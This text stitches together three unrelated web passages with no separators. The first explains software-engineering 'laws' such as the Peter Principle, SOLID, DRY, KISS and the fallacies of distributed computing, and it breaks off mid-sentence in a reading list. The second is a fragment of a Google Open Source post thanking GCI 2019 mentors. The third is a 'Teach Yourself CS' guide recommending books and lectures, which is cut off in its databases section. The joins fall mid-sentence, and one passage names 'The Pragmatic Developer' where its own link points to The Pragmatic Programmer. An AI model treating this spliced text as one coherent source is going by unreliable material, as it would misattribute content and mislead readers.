[those who tend to] remain behind [are] the\n> 'residue' \u2014 the least talented and effective IT engineers.\"\n>\n> _Bruce F. Webster_\n\nThe \"Dead Sea Effect\" suggests that in any organisation, the\nskills/talent/efficacy of engineers is often inversely proportional to their\ntime in the company.\n\nTypically, highly skilled engineers find it easy to gain employment elsewhere\nand are the first to do so. Engineers who have obsolete or weak skills will\ntend to remain with the company, as finding employment elsewhere is difficult.\nThis is particularly pronounced if they have gained incremental pay rises over\ntheir time in the company, as it can be challenging to get equivalent\nremuneration elsewhere.\n\n### The Dilbert Principle\n\n[The Dilbert Principle on\nWikipedia](https://en.wikipedia.org/wiki/Dilbert_principle)\n\n> Companies tend to systematically promote incompetent employees to management\n> to get them out of the workflow.\n>\n> _Scott Adams_\n\nA management concept developed by Scott Adams (creator of the Dilbert comic\nstrip), the Dilbert Principle is inspired by The Peter Principle. Under the\nDilbert Principle, employees who were never competent are promoted to\nmanagement in order to limit the damage they can do. Adams first explained the\nprinciple in a 1995 Wall Street Journal article, and expanded upon it in his\n1996 business book, The Dilbert Principle.\n\nSee Also:\n\n  * The Peter Principle\n  * Putt's Law\n\n### The Pareto Principle (The 80/20 Rule)\n\n[The Pareto Principle on\nWikipedia](https://en.wikipedia.org/wiki/Pareto_principle)\n\n> Most things in life are not distributed evenly.\n\nThe Pareto Principle suggests that in some cases, the majority of results come\nfrom a minority of inputs:\n\n  * 80% of a certain piece of software can be written in 20% of the total allocated time (conversely, the hardest 20% of the code takes 80% of the time)\n  * 20% of the effort produces 80% of the result\n  * 20% of the work creates 80% of the revenue\n  * 20% of the bugs cause 80% of the crashes\n  * 20% of the features cause 80% of the usage\n\nIn the 1940s American-Romanian engineer Dr. Joseph Juran, who is widely\ncredited with being the father of quality control, [began to apply the Pareto\nprinciple to quality issues](https://en.wikipedia.org/wiki/Joseph_M._Juran).\n\nThis principle is also known as: The 80/20 Rule, The Law of the Vital Few, and\nThe Principle of Factor Sparsity.\n\nReal-world examples:\n\n  * In 2002 Microsoft reported that by fixing the top 20% of the most-reported bugs, 80% of the related errors and crashes in windows and office would become eliminated ([Reference](https://www.crn.com/news/security/18821726/microsofts-ceo-80-20-rule-applies-to-bugs-not-just-features.htm)).\n\n### The Peter Principle\n\n[The Peter Principle on\nWikipedia](https://en.wikipedia.org/wiki/Peter_principle)\n\n> People in a hierarchy tend to rise to their \"level of incompetence\".\n>\n> _Laurence J. Peter_\n\nA management concept developed by Laurence J. Peter, the Peter Principle\nobserves that people who are good at their jobs are promoted, until they reach\na level where they are no longer successful (their \"level of incompetence\").\nAt this point, as they are more senior, they are less likely to be removed\nfrom the organisation (unless they perform spectacularly badly) and will\ncontinue to reside in a role which they have few intrinsic skills at, as their\noriginal skills which made them successful are not necessarily the skills\nrequired for their new jobs.\n\nThis is of particular interest to engineers - who initially start out in\ndeeply technical roles, but often have a career path which leads to _managing_\nother engineers - which requires a fundamentally different skills-set.\n\nSee Also:\n\n  * The Dilbert Principle\n  * Putt's Law\n\n### The Robustness Principle (Postel's Law)\n\n[The Robustness Principle on\nWikipedia](https://en.wikipedia.org/wiki/Robustness_principle)\n\n> Be conservative in what you do, be liberal in what you accept from others.\n\nOften applied in server application development, this principle states that\nwhat you send to others should be as minimal and conformant as possible, but\nyou should aim to allow non-conformant input if it can be processed.\n\nThe goal of this principle is to build systems which are robust, as they can\nhandle poorly formed input if the intent can still be understood. However,\nthere are potentially security implications of accepting malformed input,\nparticularly if the processing of such input is not well tested. These\nimplications and other issues are described by Eric Allman in [The Robustness\nPrinciple Reconsidered](https://queue.acm.org/detail.cfm?id=1999945).\n\nAllowing non-conformant input, in time, may undermine the ability of protocols\nto evolve as implementors will eventually rely on this liberality to build\ntheir features.\n\nSee Also:\n\n  * Hyrum's Law\n\n### SOLID\n\nThis is an acronym, which refers to:\n\n  * S: The Single Responsibility Principle\n  * O: The Open/Closed Principle\n  * L: The Liskov Substitution Principle\n  * I: The Interface Segregation Principle\n  * D: The Dependency Inversion Principle\n\nThese are key principles in Object-Oriented Programming. Design principles\nsuch as these should be able to aid developers build more maintainable\nsystems.\n\n### The Single Responsibility Principle\n\n[The Single Responsibility Principle on\nWikipedia](https://en.wikipedia.org/wiki/Single_responsibility_principle)\n\n> Every module or class should have a single responsibility only.\n\nThe first of the 'SOLID' principles. This principle suggests that modules or\nclasses should do one thing and one thing only. In more practical terms, this\nmeans that a single, small change to a feature of a program should require a\nchange in one component only. For example, changing how a password is\nvalidated for complexity should require a change in only one part of the\nprogram.\n\nTheoretically, this should make the code more robust, and easier to change.\nKnowing that a component which is being changed has a single responsibility\nonly means that _testing_ that change should be easier. Using the earlier\nexample, changing the password complexity component should only be able to\naffect the features which relate to password complexity. It can be much more\ndifficult to reason about the impact of a change to a component which has many\nresponsibilities.\n\nSee also:\n\n  * Object-Oriented Programming\n  * SOLID\n\n### The Open/Closed Principle\n\n[The Open/Closed Principle on\nWikipedia](https://en.wikipedia.org/wiki/Open%E2%80%93closed_principle)\n\n> Entities should be open for extension and closed for modification.\n\nThe second of the 'SOLID' principles. This principle states that entities\n(which could be classes, modules, functions and so on) should be able to have\ntheir behaviour _extended_ , but that their _existing_ behaviour should not be\nable to be modified.\n\nAs a hypothetical example, imagine a module which is able to turn a Markdown\ndocument into HTML. Now imagine there is a new syntax added to the Markdown\nspecification, which adds support for mathematical equations. The module\nshould be _open to extension_ to implement the new mathematics syntax.\nHowever, existing syntax implementations (like paragraphs, bullets, etc)\nshould be _closed for modification_. They already work, we don't want people\nto change them.\n\nThis principle has particular relevance for object-oriented programming, where\nwe may design objects to be easily extended, but would avoid designing objects\nwhich can have their existing behaviour changed in unexpected ways.\n\nSee also:\n\n  * Object-Oriented Programming\n  * SOLID\n\n### The Liskov Substitution Principle\n\n[The Liskov Substitution Principle on\nWikipedia](https://en.wikipedia.org/wiki/Liskov_substitution_principle)\n\n> It should be possible to replace a type with a subtype, without breaking the\n> system.\n\nThe third of the 'SOLID' principles. This principle states that if a component\nrelies on a type, then it should be able to use subtypes of that type, without\nthe system failing or having to know the details of what that subtype is.\n\nAs an example, imagine we have a method which reads an XML document from a\nstructure which represents a file. If the method uses a base type 'file', then\nanything which derives from 'file' should be able to be used in the function.\nIf 'file' supports seeking in reverse, and the XML parser uses that function,\nbut the derived type 'network file' fails when reverse seeking is attempted,\nthen the 'network file' would be violating the principle.\n\nThis principle has particular relevance for object-oriented programming, where\ntype hierarchies must be modeled carefully to avoid confusing users of a\nsystem.\n\nSee also:\n\n  * Object-Oriented Programming\n  * SOLID\n\n### The Interface Segregation Principle\n\n[The Interface Segregation Principle on\nWikipedia](https://en.wikipedia.org/wiki/Interface_segregation_principle)\n\n> No client should be forced to depend on methods it does not use.\n\nThe fourth of the 'SOLID' principles. This principle states that consumers of\na component should not depend on functions of that component which it doesn't\nactually use.\n\nAs an example, imagine we have a method which reads an XML document from a\nstructure which represents a file. It only needs to read bytes, move forwards\nor move backwards in the file. If this method needs to be updated because an\nunrelated feature of the file structure changes (such as an update to the\npermissions model used to represent file security), then the principle has\nbeen invalidated. It would be better for the file to implement a 'seekable-\nstream' interface, and for the XML reader to use that.\n\nThis principle has particular relevance for object-oriented programming, where\ninterfaces, hierarchies and abstract types are used to minimise the coupling\nbetween different components. Duck typing is a methodology which enforces this\nprinciple by eliminating explicit interfaces.\n\nSee also:\n\n  * Object-Oriented Programming\n  * SOLID\n  * Duck Typing\n  * Decoupling\n\n### The Dependency Inversion Principle\n\n[The Dependency Inversion Principle on\nWikipedia](https://en.wikipedia.org/wiki/Dependency_inversion_principle)\n\n> High-level modules should not be dependent on low-level implementations.\n\nThe fifth of the 'SOLID' principles. This principle states that higher level\norchestrating components should not have to know the details of their\ndependencies.\n\nAs an example, imagine we have a program which read metadata from a website.\nWe would assume that the main component would have to know about a component\nto download the webpage content, then a component which can read the metadata.\nIf we were to take dependency inversion into account, the main component would\ndepend only on an abstract component which can fetch byte data, and then an\nabstract component which would be able to read metadata from a byte stream.\nThe main component would not know about TCP/IP, HTTP, HTML, etc.\n\nThis principle is complex, as it can seem to 'invert' the expected\ndependencies of a system (hence the name). In practice, it also means that a\nseparate orchestrating component must ensure the correct implementations of\nabstract types are used (e.g. in the previous example, _something_ must still\nprovide the metadata reader component a HTTP file downloader and HTML meta tag\nreader). This then touches on patterns such as Inversion of Control and\nDependency Injection.\n\nSee also:\n\n  * Object-Oriented Programming\n  * SOLID\n  * Inversion of Control\n  * Dependency Injection\n\n### The DRY Principle\n\n[The DRY Principle on\nWikipedia](https://en.wikipedia.org/wiki/Don%27t_repeat_yourself)\n\n> Every piece of knowledge must have a single, unambiguous, authoritative\n> representation within a system.\n\nDRY is an acronym for _Don't Repeat Yourself_. This principle aims to help\ndevelopers reducing the repetition of code and keep the information in a\nsingle place and was cited in 1999 by Andrew Hunt and Dave Thomas in the book\n[The Pragmatic\nDeveloper](https://en.wikipedia.org/wiki/The_Pragmatic_Programmer)\n\n> The opposite of DRY would be _WET_ (Write Everything Twice or We Enjoy\n> Typing).\n\nIn practice, if you have the same piece of information in two (or more)\ndifferent places, you can use DRY to merge them into a single one and reuse it\nwherever you want/need.\n\nSee also:\n\n  * [The Pragmatic Developer](https://en.wikipedia.org/wiki/The_Pragmatic_Programmer)\n\n### The KISS principle\n\n[KISS on Wikipedia](https://en.wikipedia.org/wiki/KISS_principle)\n\n> Keep it simple, stupid\n\nThe KISS principle states that most systems work best if they are kept simple\nrather than made complicated; therefore, simplicity should be a key goal in\ndesign, and unnecessary complexity should be avoided. Originating in the U.S.\nNavy in 1960, the phrase has been associated with aircraft engineer Kelly\nJohnson.\n\nThe principle is best exemplified by the story of Johnson handing a team of\ndesign engineers a handful of tools, with the challenge that the jet aircraft\nthey were designing must be repairable by an average mechanic in the field\nunder combat conditions with only these tools. Hence, the \"stupid\" refers to\nthe relationship between the way things break and the sophistication of the\ntools available to repair them, not the capabilities of the engineers\nthemselves.\n\nSee also:\n\n  * Gall's Law\n\n### YAGNI\n\n[YAGNI on Wikipedia](https://en.wikipedia.org/wiki/You_ain%27t_gonna_need_it)\n\nThis is an acronym for _**Y** ou **A** in't **G** onna **N** eed **I** t_.\n\n> Always implement things when you actually need them, never when you just\n> foresee that you need them.\n>\n> ([Ron Jeffries](https://twitter.com/RonJeffries)) (XP co-founder and author\n> of the book \"Extreme Programming Installed\")\n\nThis _Extreme Programming_ (XP) principle suggests developers should only\nimplement functionality that is needed for the immediate requirements, and\navoid attempts to predict the future by implementing functionality that might\nbe needed later.\n\nAdhering to this principle should reduce the amount of unused code in the\ncodebase, and avoid time and effort being wasted on functionality that brings\nno value.\n\nSee also:\n\n  * Reading List: Extreme Programming Installed\n\n### The Fallacies of Distributed Computing\n\n[The Fallacies of Distributed Computing on\nWikipedia](https://en.wikipedia.org/wiki/Fallacies_of_distributed_computing)\n\nAlso known as _Fallacies of Networked Computing_ , the Fallacies are a list of\nconjectures (or beliefs) about distributed computing, which can lead to\nfailures in software development. The assumptions are:\n\n  * The network is reliable\n  * Latency is zero\n  * Bandwidth is infinite\n  * The network is secure\n  * Topology doesn't change\n  * There is one administrator\n  * Transport cost is zero\n  * The network is homogeneous\n\nThe first four items were listed by [Bill\nJoy](https://en.wikipedia.org/wiki/Bill_Joy) and [Tom\nLyon](https://twitter.com/aka_pugs) around 1991 and first classified by [James\nGosling](https://en.wikipedia.org/wiki/James_Gosling) as the \"Fallacies of\nNetworked Computing\". [L. Peter\nDeutsch](https://en.wikipedia.org/wiki/L._Peter_Deutsch) added the 5th, 6th\nand 7th fallacies. In the late 90's Gosling added the 8th fallacy.\n\nThe group were inspired by what was happening at the time inside [Sun\nMicrosystems](https://en.wikipedia.org/wiki/Sun_Microsystems).\n\nThese fallacies should be considered carefully when designing code which is\nresilient; assuming any of these fallacies can lead to flawed logic which\nfails to deal with the realities and complexities of distributed systems.\n\nSee also:\n\n  * [Foraging for the Fallacies of Distributed Computing (Part 1) - Vaidehi Joshi on Medium](https://medium.com/baseds/foraging-for-the-fallacies-of-distributed-computing-part-1-1b35c3b85b53)\n  * [Deutsch's Fallacies, 10 Years After](http://java.sys-con.com/node/38665)\n\n## Reading List\n\nIf you have found these concepts interesting, you may enjoy the following\nbooks.\n\n  * [Extreme Programming Installed - Ron Jeffries, Ann Anderson, Chet Hendrikson](https://www.goodreads.com/en/book/show/67834) \\- Covers the core principles of Extreme Programming.\n  * [The Mythical Man Month - Frederick P.

Mentors volunteer their time to help these bright students become\nopen source contributors. They spend hundreds of hours during their holiday\nbreaks answering questions, reviewing submitted tasks, and welcoming the\nstudents to their communities. GCI would not be possible without their\ndedication, patience and tireless efforts.  \n  \nWe will post more numbers from GCI 2019 here on the Google Open Source Blog\nover the next few weeks, so please stay tuned.  \n  \nCongratulations to our Grand Prize Winners, Runners Up, Finalists, and all of\nthe students who spent the last couple of months learning about, and\ncontributing to, open source. We hope they will continue their journey in open\nsource!  \n  \n_By Stephanie Taylor, Google Open Source_\n\n![Share

For the prior version,\n[see here](/2016/).\n\nIf you\u2019re a self-taught engineer or bootcamp grad, you owe it to yourself to\nlearn computer science. Thankfully, you can give yourself a world-class CS\neducation without investing years and a small fortune in a degree program \ud83d\udcb8.\n\nThere are plenty of resources out there, but some are better than others. You\ndon\u2019t need yet another \u201c200+ Free Online Courses\u201d listicle. You need answers\nto these questions:\n\n  * **Which subjects** should you learn, and why?\n  * What is the **best book or video lecture series** for each subject?\n\nThis guide is our attempt to definitively answer these questions.\n\nThank you to Wu Zhengke for this Chinese translation:\n[\u4e2d\u6587\u7ffb\u8bd1\u89c1\u6b64](https://github.com/keithnull/TeachYourselfCS-\nCN/blob/master/TeachYourselfCS-CN.md)  \nand to Clemens Schrage for this Portuguese translation: [Tradu\u00e7\u00e3o em\nportugu\u00eas](https://github.com/Clemensss/TeachYourselfCS-\nPT/blob/master/TeachYourselfCS-PT.md)\n\n## TL;DR:\n\nStudy all nine subjects below, in roughly the presented order, using either\nthe suggested textbook or video lecture series, but ideally both. Aim for\n100-200 hours of study of each topic, then revisit favorites throughout your\ncareer \ud83d\ude80.\n\nSubject | Why study? | Book | Videos  \n---|---|---|---  \n**Programming** | Don\u2019t be the person who \u201cnever quite understood\u201d something\nlike recursion. | _Structure and Interpretation of Computer Programs_ | Brian\nHarvey\u2019s Berkeley CS 61A  \n**Computer Architecture** | If you don\u2019t have a solid mental model of how a\ncomputer actually works, all of your higher-level abstractions will be\nbrittle. | _Computer Systems: A Programmer's Perspective_ | Berkeley CS 61C  \n**Algorithms and Data Structures** | If you don\u2019t know how to use ubiquitous\ndata structures like stacks, queues, trees, and graphs, you won\u2019t be able to\nsolve challenging problems. | _The Algorithm Design Manual_ | Steven Skiena\u2019s\nlectures  \n**Math for CS** | CS is basically a runaway branch of applied math, so\nlearning math will give you a competitive advantage. | _Mathematics for\nComputer Science_ | Tom Leighton\u2019s MIT 6.042J  \n**Operating Systems** | Most of the code you write is run by an operating\nsystem, so you should know how those interact. | _Operating Systems: Three\nEasy Pieces_ | Berkeley CS 162  \n**Computer Networking** | The Internet turned out to be a big deal: understand\nhow it works to unlock its full potential. | _Computer Networking: A Top-Down\nApproach_ | Stanford CS 144  \n**Databases** | Data is at the heart of most significant programs, but few\nunderstand how database systems actually work. | _Readings in Database\nSystems_ | Joe Hellerstein\u2019s Berkeley CS 186  \n**Languages and Compilers** | If you understand how languages and compilers\nactually work, you\u2019ll write better code and learn new languages more easily. |\n_Crafting Interpreters_ | Alex Aiken\u2019s course on edX  \n**Distributed Systems** | These days, _most_ systems are distributed systems.\n| _Designing Data-Intensive Applications_ by Martin Kleppmann | MIT 6.824  \n  \n## Still too much?\n\nIf the idea of self-studying 9 topics over multiple years feels overwhelming,\nwe suggest you focus on just two books: _Computer Systems: A Programmer's\nPerspective_ and _Designing Data-Intensive Applications_. In our experience,\nthese two books provide incredibly high return on time invested, particularly\nfor self-taught engineers and bootcamp grads working on networked\napplications. They may also serve as a \"gateway drug\" for the other topics and\nresources listed above.\n\n## Why learn computer science?\n\nThere are 2 types of software engineer: those who understand computer science\nwell enough to do challenging, innovative work, and those who just get by\nbecause they\u2019re familiar with a few high level tools.\n\nBoth call themselves software engineers, and both tend to earn similar\nsalaries in their early careers. But Type 1 engineers progress toward more\nfulfilling and well-remunerated work over time, whether that\u2019s valuable\ncommercial work or breakthrough open-source projects, technical leadership or\nhigh-quality individual contributions.\n\n> The global SMS system does around 20bn messages a day. WhatsApp is now doing\n> 42bn. With 57 engineers.\n> [pic.twitter.com/zZrtSIzhlR](https://t.co/zZrtSIzhlR)\n>\n> \u2014 Benedict Evans (@BenedictEvans) [February 2,\n> 2016](https://twitter.com/BenedictEvans/status/694342874729545729)\n\nType 1 engineers find ways to learn computer science in depth, whether through\nconventional means or by relentlessly learning throughout their careers. Type\n2 engineers typically stay at the surface, learning specific tools and\ntechnologies rather than their underlying foundations, only picking up new\nskills when the winds of technical fashion change.\n\nCurrently, the number of people entering the industry is rapidly increasing,\nwhile the number of CS grads is relatively static. This oversupply of Type 2\nengineers is starting to reduce their employment opportunities and keep them\nout of the industry\u2019s more fulfilling work. Whether you\u2019re striving to become\na Type 1 engineer or simply looking for more job security, learning computer\nscience is the only reliable path.\n\n[![](bilotta-tweet.png)](https://twitter.com/jenna/status/838161631662092289)\n\n## Subject guides\n\n### Programming\n\nMost undergraduate CS programs start with an \u201cintroduction\u201d to computer\nprogramming. The best versions of these courses cater not just to novices, but\nalso to those who missed beneficial concepts and programming models while\nfirst learning to code.\n\nOur standard recommendation for this content is the classic _Structure and\nInterpretation of Computer Programs_ , which is available online for free both\nas [a book](https://mitpress.mit.edu/sites/default/files/sicp/full-\ntext/book/book.html), and as a set of [MIT video\nlectures](http://ocw.mit.edu/courses/electrical-engineering-and-computer-\nscience/6-001-structure-and-interpretation-of-computer-programs-\nspring-2005/video-lectures/). While those lectures are great, our video\nsuggestion is actually [Brian Harvey\u2019s SICP\nlectures](https://archive.org/details/ucberkeley-webcast-\nPL3E89002AA9B9879E?sort=titleSorter) (for the 61A course at Berkeley) instead.\nThese are more refined and better targeted at new students than are the MIT\nlectures.\n\nWe recommend working through at least the first three chapters of SICP and\ndoing the exercises. For additional practice, work through a set of small\nprogramming problems like those on [exercism](http://exercism.io).\n\nSince this guide was first published in 2016, one of the most commonly asked\nquestions has been whether we\u2019d now recommend recordings of a more recent\niteration of 61A taught by John DeNero, and/or the corresponding book\n_[Composing Programs](https://composingprograms.com/)_ , which is \u201cin the\ntradition of SICP\u201d but uses Python. We think the DeNero resources are also\ngreat, and some students may end up preferring them, but we still suggest\nSICP, Scheme, and Brian Harvey\u2019s lectures as the first set of resources to\ntry.\n\nWhy? Because SICP is unique in its ability\u2014at least potentially\u2014to alter your\nfundamental beliefs about computers and programming. Not everybody will\nexperience this. Some will hate the book, others won't get past the first few\npages. But the potential reward makes it worth trying.\n\nIf you don't enjoy SICP, try _Composing Programs_. If that still doesn't suit,\ntry _[How to Design Programs](http://www.htdp.org/)_. If none of these seem to\nbe rewarding your effort, perhaps that's a sign that you should focus on other\ntopics for some time, and revisit the discipline of programming in another\nyear or two.\n\nFinally, a point of clarification: this guide is NOT designed for those who\nare entirely new to programming. We assume that you are a competent programmer\nwithout a background in computer science, looking to fill in some knowledge\ngaps. The fact that we've included a section on \"programming\" is simply a\nreminder that there may be more to learn. For those who've never coded before,\nbut who'd like to, you might prefer a guide like [this\none](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_getting_started).\n\n[ ![Structure and Interpretation of Computer Programs](sicp.jpg)\n](https://mitpress.mit.edu/sites/default/files/sicp/full-text/book/book.html)\n\n### Computer Architecture\n\nComputer Architecture\u2014sometimes called \u201ccomputer systems\u201d or \u201ccomputer\norganization\u201d\u2014is an important first look at computing below the surface of\nsoftware. In our experience, it\u2019s the most neglected area among self-taught\nsoftware engineers.\n\nOur favorite introductory book is _[Computer Systems: A Programmer's\nPerspective](http://csapp.cs.cmu.edu/3e/home.html)_ , and a typical\nintroductory computer architecture course using the book [would\ncover](http://csapp.cs.cmu.edu/3e/courses.html) most of chapters 1-6.\n\nWe love CS:APP for the practical, programmer-oriented approach. While there's\nmuch more to computer architecture than what's covered in the book, it serves\nas a great starting point for those who'd like to understand computer systems\nprimarily in order to write faster, more efficient and more reliable\n_software_.\n\nFor those who'd prefer both a gentler introduction to the topic and a balance\nof hardware and software concerns, we suggest _The Elements of Computing\nSystems_ , also known as \u201cNand2Tetris\u201d. This is an ambitious book attempting\nto give you a cohesive understanding of how everything in a computer works.\nEach chapter involves building a small piece of the overall system, from\nwriting elementary logic gates in HDL, through a CPU and assembler, all the\nway to an application the size of a Tetris game.\n\nWe recommend reading through the first six chapters of the book and completing\nthe associated projects. This will develop your understanding of the\nrelationship between the architecture of the machine and the software that\nruns on it.\n\nThe first half of the book (and all of its projects), are available for free\nfrom [the Nand2Tetris website](http://www.nand2tetris.org). It\u2019s also\navailable as [a Coursera course with accompanying\nvideos](https://www.coursera.org/learn/build-a-computer).\n\nIn seeking simplicity and cohesiveness, Nand2Tetris trades off depth. In\nparticular, two very important concepts in modern computer architectures are\npipelining and memory hierarchy, but both are mostly absent from the text.\n\nOnce you feel comfortable with the content of Nand2Tetris, we suggest either\nreturning to CS:APP, or considering Patterson and Hennessy\u2019s _[Computer\nOrganization and Design](https://smile.amazon.com/Computer-Organization-\nDesign-Fifth-Architecture/dp/0124077269)_ , an excellent and now classic text.\nNot every section in the book is essential; we suggest following Berkeley\u2019s\n[CS61C course](http://inst.eecs.berkeley.edu/~cs61c/sp15/) \u201cGreat Ideas in\nComputer Architecture\u201d for specific readings. The lecture notes and labs are\navailable online, and past lectures are [on the Internet\nArchive](https://archive.org/details/ucberkeley-webcast-PL-XXv-\ncvA_iCl2-D-FS5mk0jFF6cYSJs_).\n\n[ ![Computer Systems: A Programmer's Perspective](csapp.jpg)\n](http://csapp.cs.cmu.edu/3e/home.html)\n\n> Hardware is the platform\n\n\u2013 Mike Acton, Engine Director at Insomniac Games  \n([watch his CppCon talk](https://www.youtube.com/watch?v=rX0ItVEVjHc))\n\n### Algorithms and Data Structures\n\nWe agree with decades of common wisdom that familiarity with common algorithms\nand data structures is one of the most empowering aspects of a computer\nscience education. This is also a great place to train one\u2019s general problem-\nsolving abilities, which will pay off in every other area of study.\n\nThere are hundreds of books available, but our favorite is _[The Algorithm\nDesign Manual](https://smile.amazon.com/Algorithm-Design-Manual-Steven-\nSkiena/dp/1848000693/)_ by Steven Skiena. He clearly loves algorithmic problem\nsolving and typically succeeds in fostering similar enthusiasm among his\nstudents and readers. In our opinion, the two more commonly suggested texts\n(CLRS and Sedgewick) tend to be a little too proof-heavy for those learning\nthe material primarily to help with practical problem solving.\n\nFor those who prefer video lectures, [Skiena generously provides his\nonline](https://www.youtube.com/watch?v=A2bFN3MyNDA&list=PLOtl7M3yp-\nDX32N0fVIyvn7ipWKNGmwpp). We also really like Tim Roughgarden\u2019s course,\navailable [on Coursera](https://www.coursera.org/specializations/algorithms)\nand [elsewhere](http://timroughgarden.org/videos.html). Whether you prefer\nSkiena\u2019s or Roughgarden\u2019s lecture style will be a matter of personal\npreference. In fact, there are dozens of good alternatives, so if you happen\nto find another that you like, we encourage you to stick with it!\n\nFor practice, our preferred approach is for students to solve problems on\n[Leetcode](https://leetcode.com). These tend to be interesting problems with\ndecent accompanying solutions and discussions. They also help you test\nprogress against questions that are commonly used in technical interviews at\nthe more competitive software companies. We suggest solving around 100 random\nleetcode problems as part of your studies.\n\nFinally, we strongly recommend _[How to Solve\nIt](https://smile.amazon.com/How-Solve-Mathematical-Princeton-\nScience/dp/069116407X/)_ as an excellent and unique guide to general problem\nsolving; it\u2019s as applicable to computer science as it is to mathematics.\n\n[ ![The Algorithm Design\nManual](skiena.jpg)](https://smile.amazon.com/Algorithm-Design-Manual-Steven-\nSkiena/dp/1848000693/) [ ![How to Solve It](polya.jpg)\n](https://smile.amazon.com/How-Solve-Mathematical-Princeton-\nScience/dp/069116407X/)\n\n> I have only one method that I recommend extensively\u2014it\u2019s called think before\n> you write.\n\n\u2014 Richard Hamming\n\n### Mathematics for Computer Science\n\nIn some ways, computer science is an overgrown branch of applied mathematics.\nWhile many software engineers try\u2014and to varying degrees succeed\u2014at ignoring\nthis, we encourage you to embrace it with direct study. Doing so successfully\nwill give you an enormous competitive advantage over those who don\u2019t.\n\nThe most relevant area of math for CS is broadly called \u201cdiscrete\nmathematics\u201d, where \u201cdiscrete\u201d is the opposite of \u201ccontinuous\u201d and is loosely\na collection of interesting applied math topics outside of calculus. Given the\nvague definition, it\u2019s not meaningful to try to cover the entire breadth of\n\u201cdiscrete mathematics\u201d. A more realistic goal is to build a working\nunderstanding of logic, combinatorics and probability, set theory, graph\ntheory, and a little of the number theory informing cryptography. Linear\nalgebra is an additional worthwhile area of study, given its importance in\ncomputer graphics and machine learning.\n\nOur suggested starting point for discrete mathematics is the set of [lecture\nnotes by L\u00e1szl\u00f3 Lov\u00e1sz](http://www.cs.elte.hu/~lovasz/dmbook.ps). Professor\nLov\u00e1sz did a good job of making the content approachable and intuitive, so\nthis serves as a better starting point than more formal texts.\n\nFor a more advanced treatment, we suggest _[Mathematics for Computer\nScience](https://courses.csail.mit.edu/6.042/spring17/mcs.pdf)_ , the book-\nlength lecture notes for the MIT course of the same name. That course\u2019s video\nlectures are also [freely available](https://ocw.mit.edu/courses/electrical-\nengineering-and-computer-science/6-042j-mathematics-for-computer-science-\nfall-2010/video-lectures/), and are our recommended video lectures for\ndiscrete math.\n\nFor linear algebra, we suggest starting with the [Essence of linear\nalgebra](https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab)\nvideo series, followed by Gilbert Strang\u2019s\n[book](https://www.amazon.com/Introduction-Linear-Algebra-Gilbert-\nStrang/dp/0980232775/) and [video\nlectures](https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-\nspring-2010/video-lectures/).\n\n> If people do not believe that mathematics is simple, it is only because they\n> do not realize how complicated life is.\n\n\u2014 John von Neumann\n\n### Operating Systems\n\n_[Operating System Concepts](https://www.amazon.com/dp/1118063333/)_ (the\n\u201cDinosaur book\u201d) and _[Modern Operating\nSystems](https://www.amazon.com/dp/013359162X/)_ are the \u201cclassic\u201d books on\noperating systems. Both have attracted criticism for their lack of clarity and\ngeneral student unfriendliness.\n\n_Operating Systems: Three Easy Pieces_ is a good alternative that\u2019s [freely\navailable online](http://pages.cs.wisc.edu/~remzi/OSTEP/). We particularly\nlike the structure and readability of the book, and feel that the exercises\nare worthwhile.\n\nAfter OSTEP, we encourage you to explore the design decisions of specific\noperating systems, through \u201c{OS name} Internals\u201d style books such as _[Lion's\ncommentary on Unix](https://www.amazon.com/Lions-Commentary-Unix-\nJohn/dp/1573980137/)_ , _[The Design and Implementation of the FreeBSD\nOperating System](https://www.amazon.com/Design-Implementation-FreeBSD-\nOperating-System/dp/0321968972/)_ , and _[Mac OS X\nInternals](https://www.amazon.com/Mac-OS-Internals-Systems-\nApproach/dp/0321278542/)_. For Linux, we suggest Robert Love's fantastic\n[Linux Kernel Development](https://www.amazon.com/Linux-Kernel-Development-\nRobert-Love/dp/0672329468).\n\nA great way to consolidate your understanding of operating systems is to read\nthe code of a small kernel and add features. One choice is\n[xv6](https://pdos.csail.mit.edu/6.828/2016/xv6.html), a port of Unix V6 to\nANSI C and x86, maintained for a course at MIT. OSTEP has an appendix of\npotential [xv6 labs](http://pages.cs.wisc.edu/~remzi/OSTEP/lab-projects-\nxv6.pdf) full of great ideas for potential projects.\n\n[ ![Operating Systems: Three Easy Pieces](ostep.jpeg)\n](http://pages.cs.wisc.edu/~remzi/OSTEP/)\n\n### Computer Networking\n\nGiven that so much of software engineering is on web servers and clients, one\nof the most immediately valuable areas of computer science is computer\nnetworking. Our self-taught students who methodically study networking find\nthat they finally understand terms, concepts and protocols they\u2019d been\nsurrounded by for years.\n\nOur favorite book on the topic is _[Computer Networking: A Top-Down\nApproach](https://smile.amazon.com/Computer-Networking-Top-Down-\nApproach-7th/dp/0133594149/)_. The small projects and exercises in the book\nare well worth doing, and we particularly like the \u201cWireshark labs\u201d, which\nthey have [generously provided online](http://www-net.cs.umass.edu/wireshark-\nlabs/).\n\nFor those who prefer video lectures, we suggest Stanford\u2019s [_Introduction to\nComputer Networking\ncourse_](https://www.youtube.com/playlist?list=PLvFG2xYBrYAQCyz4Wx3NPoYJOFjvU7g2Z)\npreviously available via Stanford's MOOC platform Lagunita, but sadly now only\navailable as unofficial playlists on Youtube.\n\n> You can\u2019t gaze in the crystal ball and see the future. What the Internet is\n> going to be in the future is what society makes it.\n\n\u2014 Bob Kahn\n\n[ ![Computer Networking: A Top-Down Approach](top-down.jpg)\n](https://smile.amazon.com/Computer-Networking-Top-Down-\nApproach-7th/dp/0133594149/)\n\n### Databases\n\nIt takes more work to self-learn about database systems than it does with most\nother topics. It\u2019s a relatively new (i.e. post 1970s) field of study with\nstrong commercial incentives for ideas to stay behind closed doors.\nAdditionally, many potentially excellent textbook authors have preferred to\njoin or start companies instead.\n\nGiven the circumstances, we encourage self-learners to generally avoid\ntextbooks and start with [recordings of CS\n186](https://www.youtube.com/user/CS186Berkeley/videos), Joe Hellerstein\u2019s\ndatabases course at Berkeley, and to progress to reading papers after.\n\nOne paper particularly worth mentioning for new students is \u201c[Architecture of\na Database\nSystem](http://db.cs.berkeley.edu/papers/fntdb07-architecture.pdf)\u201d, which\nuniquely provides a high-level view of how relational database management\nsystems (RDBMS) work. This will serve as a useful skeleton for further study.\n\n_Readings in Database Systems_ , better known as [the databases \u201cRed\nBook\u201d](http://www.redbook.io/), is a collection of papers compiled and edited\nby Peter Bailis, Joe Hellerstein and Michael Stonebraker. For those who have\nprogressed beyond the level of the CS 186 content, the Red 